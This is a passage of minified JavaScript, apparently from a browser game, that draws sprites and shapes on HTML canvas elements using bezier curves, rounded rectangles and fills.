                            o.bezierCurveTo(201.99996948242188 * e, 156.29513549804688 * e, 205.99996948242188 * e, 167.29513549804688 * e, 213.99996948242188 * e, 173.29513549804688 * e),
                            o.bezierCurveTo(204.99996948242188 * e, 181.29513549804688 * e, 204.99996948242188 * e, 187.29513549804688 * e, 205.99996948242188 * e, 193.29513549804688 * e),
                            o.bezierCurveTo(190.99996948242188 * e, 198.29513549804688 * e, 181.99996948242188 * e, 205.29513549804688 * e, 174.99996948242188 * e, 214.29513549804688 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.restore()),
                    o.translate(r.width / 2, r.height / 2),
                    n || (o.globalAlpha = .5,
                        Ve(o, -d, -T, E, u + _, s),
                        he(o, t[0]),
                        i && o.rotate(Math.PI),
                        o.globalAlpha = 1,
                        Ve(o, -d, -T, E, u, s),
                        he(o, t[1], t[2], 4),
                        o.globalAlpha = 1,
                        Ve(o, 35 * e - d, 20 * e - T, E - 50 * e, u - 50 * e, s - 10 * e),
                        he(o, t[3])),
                    3 == n ? (o.translate(-r.width / 2, -r.height / 2),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(121 * e, 190 * e),
                        o.bezierCurveTo(129 * e, 186 * e, 137 * e, 183 * e, 135 * e, 163 * e),
                        o.bezierCurveTo(131 * e, 135 * e, 153 * e, 127 * e, 177 * e, 124 * e),
                        o.bezierCurveTo(198 * e, 120 * e, 208 * e, 122 * e, 226 * e, 128 * e),
                        o.bezierCurveTo(261 * e, 112 * e, 271 * e, 126 * e, 287 * e, 147 * e),
                        o.bezierCurveTo(310 * e, 163 * e, 304 * e, 183 * e, 283 * e, 196 * e),
                        o.bezierCurveTo(296 * e, 249 * e, 278 * e, 262 * e, 253 * e, 263 * e),
                        o.bezierCurveTo(210 * e, 264 * e, 188 * e, 252 * e, 177 * e, 234 * e),
                        o.bezierCurveTo(133 * e, 242 * e, 123 * e, 241 * e, 115 * e, 225 * e),
                        o.bezierCurveTo(109 * e, 206 * e, 115 * e, 193 * e, 121 * e, 190 * e),
                        o.closePath(),
                        he(o, t[4]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(219 * e, 144 * e),
                        o.bezierCurveTo(251 * e, 121 * e, 277 * e, 136 * e, 276 * e, 159 * e),
                        o.bezierCurveTo(276 * e, 176 * e, 273 * e, 191 * e, 242 * e, 193 * e),
                        o.bezierCurveTo(226 * e, 228 * e, 155 * e, 219 * e, 150 * e, 183 * e),
                        o.bezierCurveTo(142 * e, 144 * e, 174 * e, 127 * e, 219 * e, 144 * e),
                        o.closePath(),
                        he(o, t[5]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(123 * e, 214 * e),
                        o.bezierCurveTo(119 * e, 198 * e, 129 * e, 189 * e, 146 * e, 194 * e),
                        o.bezierCurveTo(158 * e, 201 * e, 165 * e, 218 * e, 147 * e, 226 * e),
                        o.bezierCurveTo(135 * e, 230 * e, 125 * e, 222 * e, 123 * e, 214 * e),
                        o.closePath(),
                        he(o, t[5]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(257 * e, 199 * e),
                        o.bezierCurveTo(264 * e, 199 * e, 275 * e, 213 * e, 261 * e, 220 * e),
                        o.bezierCurveTo(246 * e, 225 * e, 235 * e, 200 * e, 257 * e, 199 * e),
                        o.closePath(),
                        he(o, t[5]),
                        o.translate(-5 * e, 55 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(186 * e, 123 * e),
                        o.bezierCurveTo(198 * e, 115 * e, 219 * e, 110 * e, 219 * e, 123 * e),
                        o.bezierCurveTo(216 * e, 135 * e, 171 * e, 143 * e, 186 * e, 123 * e),
                        o.closePath(),
                        he(o, t[5]),
                        o.translate(5 * e, -55 * e),
                        o.translate(-5 * e, 15 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(171 * e, 241 * e),
                        o.bezierCurveTo(189 * e, 234 * e, 200 * e, 248 * e, 189 * e, 254 * e),
                        o.bezierCurveTo(179 * e, 260 * e, 158 * e, 246 * e, 171 * e, 241 * e),
                        o.closePath(),
                        he(o, t[5])) : 4 == n && (o.translate(-r.width / 2, -r.height / 2),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(30 * e, 167 * e),
                            o.bezierCurveTo(47 * e, 144 * e, 64 * e, 140 * e, 80 * e, 147 * e),
                            o.bezierCurveTo(95 * e, 154 * e, 95 * e, 159 * e, 100 * e, 179 * e),
                            o.bezierCurveTo(105 * e, 202 * e, 95 * e, 218 * e, 69 * e, 218 * e),
                            o.bezierCurveTo(48 * e, 236 * e, 26 * e, 223 * e, 28 * e, 213 * e),
                            o.bezierCurveTo(28 * e, 205 * e, 29 * e, 199 * e, 32 * e, 195 * e),
                            o.bezierCurveTo(21 * e, 183 * e, 27 * e, 173 * e, 30 * e, 167 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(26 * e, 145 * e),
                            o.bezierCurveTo(32 * e, 138 * e, 37 * e, 137 * e, 40 * e, 139 * e),
                            o.bezierCurveTo(43 * e, 140 * e, 41 * e, 150 * e, 31 * e, 159 * e),
                            o.bezierCurveTo(23 * e, 166 * e, 17 * e, 158 * e, 26 * e, 145 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(13 * e, 193 * e),
                            o.bezierCurveTo(21 * e, 187 * e, 30 * e, 190 * e, 20 * e, 202 * e),
                            o.bezierCurveTo(13 * e, 208 * e, 7 * e, 202 * e, 13 * e, 193 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(121 * e, 190 * e),
                            o.bezierCurveTo(129 * e, 186 * e, 137 * e, 183 * e, 135 * e, 163 * e),
                            o.bezierCurveTo(131 * e, 135 * e, 153 * e, 127 * e, 177 * e, 124 * e),
                            o.bezierCurveTo(198 * e, 120 * e, 208 * e, 122 * e, 226 * e, 128 * e),
                            o.bezierCurveTo(261 * e, 112 * e, 271 * e, 126 * e, 287 * e, 147 * e),
                            o.bezierCurveTo(310 * e, 163 * e, 304 * e, 183 * e, 283 * e, 196 * e),
                            o.bezierCurveTo(296 * e, 249 * e, 278 * e, 262 * e, 253 * e, 263 * e),
                            o.bezierCurveTo(210 * e, 264 * e, 188 * e, 252 * e, 177 * e, 234 * e),
                            o.bezierCurveTo(133 * e, 242 * e, 123 * e, 241 * e, 115 * e, 225 * e),
                            o.bezierCurveTo(109 * e, 206 * e, 115 * e, 193 * e, 121 * e, 190 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(335 * e, 196 * e),
                            o.bezierCurveTo(312 * e, 208 * e, 300 * e, 185 * e, 309 * e, 167 * e),
                            o.bezierCurveTo(314 * e, 141 * e, 339 * e, 127 * e, 359 * e, 144 * e),
                            o.bezierCurveTo(363 * e, 148 * e, 364 * e, 150 * e, 364 * e, 150 * e),
                            o.bezierCurveTo(392 * e, 143 * e, 396 * e, 183 * e, 378 * e, 204 * e),
                            o.bezierCurveTo(367 * e, 215 * e, 339 * e, 208 * e, 335 * e, 196 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(349 * e, 212 * e),
                            o.bezierCurveTo(339 * e, 216 * e, 334 * e, 208 * e, 341 * e, 203 * e),
                            o.bezierCurveTo(353 * e, 198 * e, 361 * e, 205 * e, 349 * e, 212 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(46 * e, 165 * e),
                            o.bezierCurveTo(55 * e, 148 * e, 85 * e, 157 * e, 83 * e, 175 * e),
                            o.bezierCurveTo(99 * e, 185 * e, 89 * e, 212 * e, 66 * e, 204 * e),
                            o.bezierCurveTo(55 * e, 212 * e, 43 * e, 212 * e, 41 * e, 202 * e),
                            o.bezierCurveTo(39 * e, 194 * e, 42 * e, 187 * e, 49 * e, 185 * e),
                            o.bezierCurveTo(44 * e, 175 * e, 45 * e, 172 * e, 46 * e, 165 * e),
                            o.closePath(),
                            he(o, t[4]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(219 * e, 144 * e),
                            o.bezierCurveTo(251 * e, 121 * e, 277 * e, 136 * e, 276 * e, 159 * e),
                            o.bezierCurveTo(276 * e, 176 * e, 273 * e, 191 * e, 242 * e, 193 * e),
                            o.bezierCurveTo(226 * e, 228 * e, 155 * e, 219 * e, 150 * e, 183 * e),
                            o.bezierCurveTo(142 * e, 144 * e, 174 * e, 127 * e, 219 * e, 144 * e),
                            o.closePath(),
                            he(o, t[5]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(123 * e, 214 * e),
                            o.bezierCurveTo(119 * e, 198 * e, 129 * e, 189 * e, 146 * e, 194 * e),
                            o.bezierCurveTo(158 * e, 201 * e, 165 * e, 218 * e, 147 * e, 226 * e),
                            o.bezierCurveTo(135 * e, 230 * e, 125 * e, 222 * e, 123 * e, 214 * e),
                            o.closePath(),
                            he(o, t[5]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(257 * e, 199 * e),
                            o.bezierCurveTo(264 * e, 199 * e, 275 * e, 213 * e, 261 * e, 220 * e),
                            o.bezierCurveTo(246 * e, 225 * e, 235 * e, 200 * e, 257 * e, 199 * e),
                            o.closePath(),
                            he(o, t[5]),
                            o.translate(-5 * e, 55 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(186 * e, 123 * e),
                            o.bezierCurveTo(198 * e, 115 * e, 219 * e, 110 * e, 219 * e, 123 * e),
                            o.bezierCurveTo(216 * e, 135 * e, 171 * e, 143 * e, 186 * e, 123 * e),
                            o.closePath(),
                            he(o, t[5]),
                            o.translate(5 * e, -55 * e),
                            o.translate(-5 * e, 15 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(171 * e, 241 * e),
                            o.bezierCurveTo(189 * e, 234 * e, 200 * e, 248 * e, 189 * e, 254 * e),
                            o.bezierCurveTo(179 * e, 260 * e, 158 * e, 246 * e, 171 * e, 241 * e),
                            o.closePath(),
                            he(o, t[5]),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(367 * e, 164 * e),
                            o.bezierCurveTo(380 * e, 160 * e, 391 * e, 185 * e, 371 * e, 189 * e),
                            o.bezierCurveTo(362 * e, 192 * e, 354 * e, 191 * e, 350 * e, 185 * e),
                            o.bezierCurveTo(326 * e, 205 * e, 314 * e, 182 * e, 316 * e, 171 * e),
                            o.bezierCurveTo(317 * e, 150 * e, 332 * e, 143 * e, 347 * e, 147 * e),
                            o.bezierCurveTo(361 * e, 151 * e, 366 * e, 158 * e, 367 * e, 164 * e),
                            o.closePath(),
                            he(o, t[4])),
                    r
            }
            function Y1(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d");
                return r.width = 121 * e,
                    r.height = 130 * e,
                    o.translate(0, 20 * e),
                    1 == i && (o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(6 * e, 23 * e),
                        o.bezierCurveTo(6 * e, 46 * e, 6 * e, 46 * e, 6 * e, 69 * e),
                        o.bezierCurveTo(21 * e, 69 * e, 21 * e, 69 * e, 36 * e, 69 * e),
                        o.bezierCurveTo(45.5 * e, 78.5 * e, 45.5 * e, 78.5 * e, 55 * e, 88 * e),
                        o.bezierCurveTo(55.5 * e, 45.5 * e, 55.5 * e, 45.5 * e, 56 * e, 3 * e),
                        o.bezierCurveTo(47 * e, 14 * e, 47 * e, 14 * e, 38 * e, 25 * e),
                        o.bezierCurveTo(23 * e, 25 * e, 23 * e, 25 * e, 6 * e, 23 * e),
                        o.closePath(),
                        he(o, void 0, t[3], 13 * e)),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(6 * e, 23 * e),
                    o.bezierCurveTo(6 * e, 46 * e, 6 * e, 46 * e, 6 * e, 69 * e),
                    o.bezierCurveTo(21 * e, 69 * e, 21 * e, 69 * e, 36 * e, 69 * e),
                    o.bezierCurveTo(45.5 * e, 78.5 * e, 45.5 * e, 78.5 * e, 55 * e, 88 * e),
                    o.bezierCurveTo(55.5 * e, 45.5 * e, 55.5 * e, 45.5 * e, 56 * e, 3 * e),
                    o.bezierCurveTo(47 * e, 14 * e, 47 * e, 14 * e, 38 * e, 25 * e),
                    o.bezierCurveTo(23 * e, 25 * e, 23 * e, 25 * e, 6 * e, 23 * e),
                    o.closePath(),
                    he(o, t[1], t[2], 4 * e),
                    1 == n ? (o.translate(0, 5 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(67 * e, 30 * e),
                        o.bezierCurveTo(73 * e, 47 * e, 69 * e, 45 * e, 67 * e, 58 * e),
                        he(o, void 0, t[0], 10 * e),
                        o.translate(3, 0 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(70 * e, 17 * e),
                        o.bezierCurveTo(83 * e, 45 * e, 76 * e, 55 * e, 70 * e, 69 * e),
                        he(o, void 0, t[0], 10 * e),
                        o.translate(3, 0 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(76 * e, 8 * e),
                        o.bezierCurveTo(88 * e, 31 * e, 89 * e, 55 * e, 76 * e, 79 * e),
                        he(o, void 0, t[0], 10 * e),
                        1 == i ? (o.translate(-6 * e, -5 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(67 * e, 30 * e),
                            o.bezierCurveTo(73 * e, 47 * e, 69 * e, 45 * e, 67 * e, 58 * e),
                            he(o, void 0, t[3], 18 * e),
                            o.translate(3, 0 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(70 * e, 17 * e),
                            o.bezierCurveTo(83 * e, 45 * e, 76 * e, 55 * e, 70 * e, 69 * e),
                            he(o, void 0, t[3], 18 * e),
                            o.translate(3, 0 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(76 * e, 8 * e),
                            o.bezierCurveTo(88 * e, 31 * e, 89 * e, 55 * e, 76 * e, 79 * e),
                            he(o, void 0, t[3], 18 * e),
                            o.translate(-6, 0 * e)) : o.translate(-6 * e, -5 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(67 * e, 30 * e),
                        o.bezierCurveTo(73 * e, 47 * e, 69 * e, 45 * e, 67 * e, 58 * e),
                        he(o, void 0, t[2], 10 * e),
                        o.translate(3, 0 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(70 * e, 17 * e),
                        o.bezierCurveTo(83 * e, 45 * e, 76 * e, 55 * e, 70 * e, 69 * e),
                        he(o, void 0, t[2], 10 * e),
                        o.translate(3, 0 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(76 * e, 8 * e),
                        o.bezierCurveTo(88 * e, 31 * e, 89 * e, 55 * e, 76 * e, 79 * e),
                        he(o, void 0, t[2], 10 * e)) : (1 == i ? (o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(108 * e, 27 * e),
                            o.bezierCurveTo(94 * e, 45.5 * e, 94 * e, 45.5 * e, 80 * e, 64 * e),
                            o.closePath(),
                            he(o, void 0, t[3], 18 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(79 * e, 30 * e),
                            o.bezierCurveTo(93 * e, 47 * e, 93 * e, 47 * e, 107 * e, 64 * e),
                            o.closePath(),
                            he(o, void 0, t[3], 18 * e)) : (o.translate(0, -5 * e),
                                o.beginPath(),
                                o.lineCap = "round",
                                o.lineJoin = "round",
                                o.moveTo(108 * e, 27 * e),
                                o.bezierCurveTo(94 * e, 45.5 * e, 94 * e, 45.5 * e, 80 * e, 64 * e),
                                o.closePath(),
                                he(o, void 0, t[0], 7 * e),
                                o.beginPath(),
                                o.lineCap = "round",
                                o.lineJoin = "round",
                                o.moveTo(79 * e, 30 * e),
                                o.bezierCurveTo(93 * e, 47 * e, 93 * e, 47 * e, 107 * e, 64 * e),
                                o.closePath(),
                                he(o, void 0, t[0], 7 * e),
                                o.translate(0, 5 * e)),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(108 * e, 27 * e),
                            o.bezierCurveTo(94 * e, 45.5 * e, 94 * e, 45.5 * e, 80 * e, 64 * e),
                            o.closePath(),
                            he(o, void 0, t[2], 7 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(79 * e, 30 * e),
                            o.bezierCurveTo(93 * e, 47 * e, 93 * e, 47 * e, 107 * e, 64 * e),
                            o.closePath(),
                            he(o, void 0, t[2], 7 * e)),
                    r
            }
            function F1(e, t, i) {
                var n, r, o = document.createElement("canvas"), a = o.getContext("2d"), s = (n = 450 * e) / 2, _ = (r = 145 * e) / 2, E = 10 * e, u = 300 * e, d = 30 * e, T = u / 2, A = d / 2;
                return i ? (r = 450 * e,
                    o.width = n = 145 * e,
                    o.height = r,
                    a.rotate(Math.PI / 2),
                    a.save(),
                    a.globalAlpha = .5,
                    Ve(a, 100 * e, -110 * e, u, d, E),
                    he(a, t[0]),
                    a.translate(178 * e, -98 * e),
                    Ve(a, -T, -A - 6 * e, 100 * e, 100 * e, E),
                    he(a, t[0]),
                    a.translate(-50 * e, 5 * e),
                    Ve(a, 220 * e, -15 * e, 90 * e, 90 * e, E),
                    he(a, t[0]),
                    a.restore(),
                    a.save(),
                    a.globalAlpha = 1,
                    a.translate(250 * e, -63 * e),
                    Ve(a, -T - 20 * e, -A, u, d, E),
                    he(a, t[1], t[2], 4),
                    a.translate(-70 * e, -40 * e),
                    Ve(a, -T - 20 * e, -A, 100 * e, 100 * e, E),
                    he(a, t[3], t[4], 4),
                    a.translate(-70 * e, 15 * e),
                    Ve(a, 220 * e, -22 * e, 90 * e, 90 * e, E),
                    he(a, t[3], t[4], 4),
                    Ve(a, 230 * e, -12 * e, 55 * e, 55 * e, E),
                    he(a, t[5]),
                    a.translate(-70 * e, 0),
                    Ve(a, -15 * e, -2 * e, 60 * e, 60 * e, E)) : (o.width = n,
                        o.height = r,
                        a.save(),
                        a.globalAlpha = .5,
                        a.translate(s, _ + 10 * e),
                        Ve(a, -T, -A, u, d, E),
                        he(a, t[0]),
                        a.translate(-65 * e, -25 * e),
                        Ve(a, -T, -A - 6 * e, 100 * e, 100 * e, 15 * e),
                        he(a, t[0]),
                        a.translate(-35 * e, -5 * e),
                        Ve(a, 220 * e, -15 * e, 90 * e, 90 * e, 15 * e),
                        he(a, t[0]),
                        a.restore(),
                        a.save(),
                        a.globalAlpha = 1,
                        a.translate(240 * e, 70 * e),
                        Ve(a, -T, -A, u, d, E),
                        he(a, t[1], t[2], 4),
                        a.translate(-60 * e, -40 * e),
                        Ve(a, -T - 20 * e, -A, 100 * e, 100 * e, 15 * e),
                        he(a, t[3], t[4], 4),
                        a.translate(-55 * e, 10 * e),
                        Ve(a, 220 * e, -22 * e, 90 * e, 90 * e, 15 * e),
                        he(a, t[3], t[4], 4),
                        Ve(a, 240 * e, -12 * e, 55 * e, 55 * e, 12 * e),
                        he(a, t[5]),
                        a.translate(45 * e, 0 * e),
                        Ve(a, -145 * e, -2 * e, 60 * e, 60 * e, 12 * e)),
                    he(a, t[5]),
                    a.restore(),
                    o
            }
            function J1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = Math.max(t.width, e.width)
                    , o = Math.max(t.height, e.height);
                return i.width = r,
                    i.height = o,
                    n.drawImage(e, (r - e.width) / 2, (o - e.height) / 2),
                    n.drawImage(t, (r - t.width) / 2, (o - t.height) / 2),
                    i
            }
            function X1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 105 * e
                    , a = 125 * e
                    , s = 4 * e
                    , _ = 10 * e
                    , E = 5 * e
                    , u = 10 * e
                    , d = 110 * e
                    , T = u / 2
                    , A = d / 2;
                return n.width = o,
                    n.height = a,
                    r.save(),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(o / 2 + 8 * e, a / 2 + E),
                    Ve(r, -T, -A, u, d, _),
                    he(r, t ? i[0] : i[1]),
                    r.translate(-130 * e + E, -128 * e + E),
                    r.beginPath(),
                    r.bezierCurveTo(159 * e, 93 * e, 156 * e, 99 * e, 154 * e, 102 * e),
                    r.bezierCurveTo(128 * e, 92 * e, 90 * e, 93 * e, 72 * e, 96 * e),
                    r.bezierCurveTo(68 * e, 84 * e, 143 * e, 73 * e, 162 * e, 86 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.restore(),
                    r.translate(o / 2 + 8, a / 2),
                    r.globalAlpha = 1,
                    Ve(r, -T, -A, u, d, _),
                    he(r, i[3], i[4], s),
                    r.translate(-130 * e, -125 * e),
                    r.beginPath(),
                    r.bezierCurveTo(159 * e, 93 * e, 156 * e, 99 * e, 154 * e, 102 * e),
                    r.bezierCurveTo(128 * e, 92 * e, 90 * e, 93 * e, 72 * e, 96 * e),
                    r.bezierCurveTo(68 * e, 84 * e, 143 * e, 73 * e, 162 * e, 86 * e),
                    r.closePath(),
                    he(r, i[5], i[6], s),
                    n
            }
            function j1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 170 * e,
                    n.height = 469 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(20 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(88 * e, 30 * e),
                    r.bezierCurveTo(96 * e, 49.5 * e, 96 * e, 49.5 * e, 104 * e, 69 * e),
                    r.bezierCurveTo(105.5 * e, 41.5 * e, 105.5 * e, 41.5 * e, 107 * e, 14 * e),
                    r.bezierCurveTo(114 * e, 9.5 * e, 114 * e, 9.5 * e, 121 * e, 5 * e),
                    r.bezierCurveTo(135.5 * e, 27.5 * e, 135.5 * e, 27.5 * e, 150 * e, 50 * e),
                    r.bezierCurveTo(110.5 * e, 286 * e, 110.5 * e, 286 * e, 103 * e, 331 * e),
                    r.bezierCurveTo(69.5 * e, 325 * e, 69.5 * e, 325 * e, 36 * e, 319 * e),
                    r.bezierCurveTo(56.5 * e, 180 * e, 56.5 * e, 180 * e, 77 * e, 41 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 31 * e),
                    r.bezierCurveTo(125 * e, 43 * e, 125 * e, 43 * e, 132 * e, 55 * e),
                    r.bezierCurveTo(109.5 * e, 185.5 * e, 109.5 * e, 185.5 * e, 87 * e, 316 * e),
                    r.bezierCurveTo(72 * e, 313.5 * e, 72 * e, 313.5 * e, 57 * e, 311 * e),
                    r.bezierCurveTo(76.5 * e, 181 * e, 76.5 * e, 181 * e, 96 * e, 51 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56 * e, 328 * e),
                    r.bezierCurveTo(47 * e, 385.5 * e, 47 * e, 385.5 * e, 38 * e, 443 * e),
                    r.bezierCurveTo(52 * e, 446 * e, 52 * e, 446 * e, 66 * e, 449 * e),
                    r.bezierCurveTo(76.5 * e, 388.5 * e, 76.5 * e, 388.5 * e, 87 * e, 328 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(74 * e, 302 * e),
                    r.bezierCurveTo(104 * e, 316.5 * e, 104 * e, 316.5 * e, 134 * e, 331 * e),
                    r.bezierCurveTo(133 * e, 341 * e, 133 * e, 341 * e, 132 * e, 351 * e),
                    r.bezierCurveTo(69.5 * e, 342 * e, 69.5 * e, 342 * e, 7 * e, 333 * e),
                    r.bezierCurveTo(8 * e, 323 * e, 8 * e, 323 * e, 9 * e, 313 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(51.5 * e, 440.5 * e),
                    r.rotate(.2),
                    Ve(r, -20.5 * e, -18.5 * e, 41 * e, 37 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(73 * e, 316 * e),
                    r.bezierCurveTo(90 * e, 324.5 * e, 90 * e, 324.5 * e, 107 * e, 333 * e),
                    r.bezierCurveTo(70 * e, 327.5 * e, 70 * e, 327.5 * e, 33 * e, 322 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-20 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(88 * e, 30 * e),
                    r.bezierCurveTo(96 * e, 49.5 * e, 96 * e, 49.5 * e, 104 * e, 69 * e),
                    r.bezierCurveTo(105.5 * e, 41.5 * e, 105.5 * e, 41.5 * e, 107 * e, 14 * e),
                    r.bezierCurveTo(114 * e, 9.5 * e, 114 * e, 9.5 * e, 121 * e, 5 * e),
                    r.bezierCurveTo(135.5 * e, 27.5 * e, 135.5 * e, 27.5 * e, 150 * e, 50 * e),
                    r.bezierCurveTo(110.5 * e, 286 * e, 110.5 * e, 286 * e, 103 * e, 331 * e),
                    r.bezierCurveTo(69.5 * e, 325 * e, 69.5 * e, 325 * e, 36 * e, 319 * e),
                    r.bezierCurveTo(56.5 * e, 180 * e, 56.5 * e, 180 * e, 77 * e, 41 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 31 * e),
                    r.bezierCurveTo(125 * e, 43 * e, 125 * e, 43 * e, 132 * e, 55 * e),
                    r.bezierCurveTo(109.5 * e, 185.5 * e, 109.5 * e, 185.5 * e, 87 * e, 316 * e),
                    r.bezierCurveTo(72 * e, 313.5 * e, 72 * e, 313.5 * e, 57 * e, 311 * e),
                    r.bezierCurveTo(76.5 * e, 181 * e, 76.5 * e, 181 * e, 96 * e, 51 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(88 * e, 30 * e),
                    r.bezierCurveTo(96 * e, 49.5 * e, 96 * e, 49.5 * e, 104 * e, 69 * e),
                    r.bezierCurveTo(105.5 * e, 41.5 * e, 105.5 * e, 41.5 * e, 107 * e, 14 * e),
                    r.bezierCurveTo(114 * e, 9.5 * e, 114 * e, 9.5 * e, 121 * e, 5 * e),
                    r.bezierCurveTo(135.5 * e, 27.5 * e, 135.5 * e, 27.5 * e, 150 * e, 50 * e),
                    r.bezierCurveTo(110.5 * e, 286 * e, 110.5 * e, 286 * e, 103 * e, 331 * e),
                    r.bezierCurveTo(69.5 * e, 325 * e, 69.5 * e, 325 * e, 36 * e, 319 * e),
                    r.bezierCurveTo(56.5 * e, 180 * e, 56.5 * e, 180 * e, 77 * e, 41 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56 * e, 328 * e),
                    r.bezierCurveTo(47 * e, 385.5 * e, 47 * e, 385.5 * e, 38 * e, 443 * e),
                    r.bezierCurveTo(52 * e, 446 * e, 52 * e, 446 * e, 66 * e, 449 * e),
                    r.bezierCurveTo(76.5 * e, 388.5 * e, 76.5 * e, 388.5 * e, 87 * e, 328 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(74 * e, 302 * e),
                    r.bezierCurveTo(104 * e, 316.5 * e, 104 * e, 316.5 * e, 134 * e, 331 * e),
                    r.bezierCurveTo(133 * e, 341 * e, 133 * e, 341 * e, 132 * e, 351 * e),
                    r.bezierCurveTo(69.5 * e, 342 * e, 69.5 * e, 342 * e, 7 * e, 333 * e),
                    r.bezierCurveTo(8 * e, 323 * e, 8 * e, 323 * e, 9 * e, 313 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 7 * e),
                    r.save(),
                    r.translate(51.5 * e, 440.5 * e),
                    r.rotate(.2),
                    Ve(r, -20.5 * e, -18.5 * e, 41 * e, 37 * e, 10 * e),
                    r.restore(),
                    he(r, i[4], i[5], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(73 * e, 316 * e),
                    r.bezierCurveTo(90 * e, 324.5 * e, 90 * e, 324.5 * e, 107 * e, 333 * e),
                    r.bezierCurveTo(70 * e, 327.5 * e, 70 * e, 327.5 * e, 33 * e, 322 * e),
                    r.closePath(),
                    he(r, i[6]),
                    n
            }
            function q1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
